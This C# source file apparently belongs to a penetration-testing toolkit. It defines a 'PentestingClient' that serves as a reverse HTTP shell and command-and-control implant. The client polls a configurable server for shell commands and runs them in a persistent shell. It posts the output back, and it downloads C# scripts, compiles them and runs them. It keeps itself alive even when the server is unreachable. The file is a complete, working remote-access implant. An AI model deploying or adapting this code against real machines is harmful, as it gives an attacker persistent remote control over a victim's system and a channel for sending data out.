using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PentestingCommon
{
    public class PentestingClient
    {
        public bool KeepAlive { get; set; } = true;
        public PersistentShell Shell { get; set; }
        public string ReverseEndPoint { get; set; } = "api/ReverseHttpShell";
        public CSharpScriptEngine ScriptEngine { get; set; }
        public string ScriptEndPoint { get; set; } = "api/ScriptEngine";
        public string BaseAddress { get; set; } = "https://localhost:44349/";
        public int Id { get; set; } = 0; // todo: should get this from server

        public PentestingClient(string[] args)
        {
            // get command line arguments
            GetArgs(args);
        }

        /// <summary>
        /// Gets the command arguments from the <paramref name="args"/>.
        /// </summary>
        /// <param name="args">The command line arguments to parse.</param>
        private void GetArgs(string[] args)
        {
            // set base address
            var index = Array.IndexOf(args, "-h");
            if (index != -1)
            {
                BaseAddress = args[index + 1];
            }
            // set id
            index = Array.IndexOf(args, "-i");
            if (index != -1)
            {
                Id = int.Parse(args[index + 1]);
            }
        }

        /// <summary>
        /// Runs the <seealso cref="Shell"/> and <seealso cref="ScriptEngine"/>.
        /// </summary>
        /// <returns></returns>
        public async Task Run()
        {
            // create shell
            Shell = new PersistentShell();

            // start recieving commands
            RecieveCommands();
            // send output
            SendOutput();

            // create script engine
            ScriptEngine = new CSharpScriptEngine();

            // compile any given scripts
            GetScripts();

            // wait until supposed to close
            await ShouldClose();
        }



        /// <summary>
        /// Checks to see if this client should close.
        /// </summary>
        /// <returns></returns>
        private async Task ShouldClose()
        {
            while (KeepAlive)
            {
                await Task.Delay(5_000);

                // create http client
                using var client = new HttpClient();

                // see if shell should stay alive
                try
                {
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ReverseEndPoint}/{Id}");
                    KeepAlive = bool.Parse(responseStr);
                }
                catch (Exception)
                {
                    // keep the client alive who knows maybe the server is down
                    KeepAlive = true;
                }
            }
        }

        /// <summary>
        /// Gets any C# script that should be executed by the client.
        /// </summary>
        private async void GetScripts()
        {
            while (KeepAlive)
            {
                await Task.Delay(1_000);

                // create http client
                using var client = new HttpClient();
                try
                {
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ScriptEndPoint}/{Id}");
                    // if response isn't null or empty write command to shell
                    if (!string.IsNullOrEmpty(responseStr))
                    {
                        var compilationResults = await ScriptEngine.Run(responseStr); // todo: don't know if the roslyn analyzer ever returns anything

                        // post script output
                        await PostScriptsOutput(client, compilationResults);
                    }
                }
                catch (Exception ex)
                {
                    await PostScriptsOutput(client, ex.ToString());
                }
            }
        }

        /// <summary>
        /// Posts the <paramref name="compilationResults"/> of the <seealso cref="ScriptEngine"/>.
        /// </summary>
        /// <param name="client">The <see cref="HttpClient"/> to use to make the POST.</param>
        /// <param name="compilationResults">The results of the <seealso cref="ScriptEngine"/>.</param>
        /// <returns></returns>
        private async Task PostScriptsOutput(HttpClient client, string compilationResults)
        {
            var sentData = false;

            // create standard output object
            var outputObj = new StandardOutputObject
            {
                Id = Id,
                Output = compilationResults
            };
            // create json
            var json = JsonConvert.SerializeObject(outputObj);
            // create string content object
            var data = new StringContent(json, Encoding.UTF8, "application/json");
            while (!sentData && KeepAlive)
            {
                await Task.Delay(10);
                try
                {
                    var response = await client.PostAsync(BaseAddress + ScriptEndPoint, data);
                    sentData = response.IsSuccessStatusCode;
                }
                catch (Exception)
                {
                    // just ignore this want to post data to server if at all possible so keep looping
                }
            }
        }

        /// <summary>
        /// Sends the output of the commands that are executed in the <seealso cref="Shell"/> 
        /// to <seealso cref="BaseAddress"/> <seealso cref="ReverseEndPoint"/>.
        /// </summary>
        private async void SendOutput()
        {
            while (KeepAlive)
            {
                // wait for shell output
                var output = await Shell.WaitForShellOutput();

                // if output isn't null or empty
                if (!string.IsNullOrEmpty(output))
                {
                    // clear current output
                    Shell.CurrentOutput.Clear();

                    // post shell output
                    await PostShellOutput(output);
                }
            }
        }

        /// <summary>
        /// Posts the <paramref name="output"/> of the <seealso cref="Shell"/>.
        /// </summary>
        /// <param name="output">The standard output and error of the <see cref="PersistentShell"/>.</param>
        /// <returns></returns>
        private async Task PostShellOutput(string output)
        {
            // create standard output object
            var outputObj = new StandardOutputObject
            {
                Id = Id,
                Output = output
            };
            // create json
            var json = JsonConvert.SerializeObject(outputObj);
            // create string content object
            var data = new StringContent(json, Encoding.UTF8, "application/json");
            var client = new HttpClient();

            // post data
            var sentData = false;
            while (!sentData && KeepAlive)
            {
                await Task.Delay(10);
                try
                {
                    var response = await client.PostAsync(BaseAddress + ReverseEndPoint, data);
                    sentData = response.IsSuccessStatusCode;
                }
                catch (Exception)
                {
                    // just ignore this want to post data to server if at all possible so keep looping
                }
            }
        }

        /// <summary>
        /// Recieve commands from <seealso cref="BaseAddress"/> <seealso cref="ReverseEndPoint"/> asynchronously.
        /// </summary>
        private async void RecieveCommands()
        {
            while (KeepAlive)
            {
                await Task.Delay(10);

                try
                {
                    // create http client
                    using var client = new HttpClient();
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ReverseEndPoint}/{Id}/{false}");
                    // if response isn't null or empty write command to shell
                    if (!string.IsNullOrEmpty(responseStr))
                    {
                        Shell.Write(new StandardInputObject { Id = Id, Input = responseStr }, false);
                    }
                }
                catch (Exception)
                {
                    // ignoring this intentionally don't want the pentesting client to close just because it can't make a connection
                }
            }
        }
    }
}
